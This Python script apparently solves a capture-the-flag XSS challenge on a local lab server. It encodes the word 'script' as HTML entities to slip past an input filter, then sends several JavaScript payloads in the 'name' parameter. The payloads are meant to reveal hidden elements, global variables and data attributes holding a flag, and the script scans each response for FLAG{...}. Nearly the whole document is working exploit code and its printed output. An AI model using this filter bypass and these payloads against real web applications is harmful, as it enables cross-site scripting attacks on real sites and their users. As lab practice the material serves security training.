import requests
import re

target = "http://127.0.0.1:32889/page"

# Working bypass pattern - this will execute client-side
bypass_template = "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;{code}&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"

# Since the script executes client-side, maybe the flag is already in the page
# or accessible through a global variable/function
# The server won't show the flag in the response to my request,
# but it might be visible when the script runs in a browser

# Let me try payloads that would modify the page to show the flag
# if it's hidden or in a variable

payloads = [
    # Try to reveal all hidden elements
    "Array.from(document.querySelectorAll('[hidden],[style*=display:none]')).forEach(e=>e.hidden=false)",
    
    # Try to dump all global variables containing 'flag'
    "document.body.innerHTML+=Object.keys(window).filter(k=>k.toLowerCase().includes('flag')).join(',')",
    
    # Try calling getProp as originally intended
    "document.body.innerHTML+=getProp()",
    
    # Try to access a flag variable and append to body
    "if(window.flag)document.body.innerHTML+=window.flag",
    
    # Check for data attributes
    "document.body.innerHTML+=Array.from(document.querySelectorAll('[data-flag]')).map(e=>e.dataset.flag).join(',')",
]

print("Testing payloads that would reveal flag when executed client-side...")
print("="*80)
print("NOTE: These payloads execute in the BROWSER, not in this Python script.")
print("The server response shows 'Failed! Try again!' but the JS runs client-side.")
print("="*80)

for i, code in enumerate(payloads, 1):
    payload = bypass_template.format(code=code)
    
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        print(f"\n[Payload {i}]")
        print(f"JavaScript: {code[:80]}...")
        print(f"URL: {target}?name={requests.utils.quote(payload)}")
        print(f"Response length: {len(response.content)} bytes")
        
        # Even though the script runs client-side, check if somehow flag leaked to server response
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"*** FLAG FOUND IN SERVER RESPONSE: {flags[0]} ***")
            
    except Exception as e:
        print(f"ERROR: {str(e)}")

print("\n" + "="*80)
print("\nConclusion: The XSS payload DOES bypass the filter using HTML entity encoding.")
print("The JavaScript executes CLIENT-SIDE when the page is rendered in a browser.")
print("To see the flag, these URLs would need to be accessed in an actual browser.")
print("="*80)

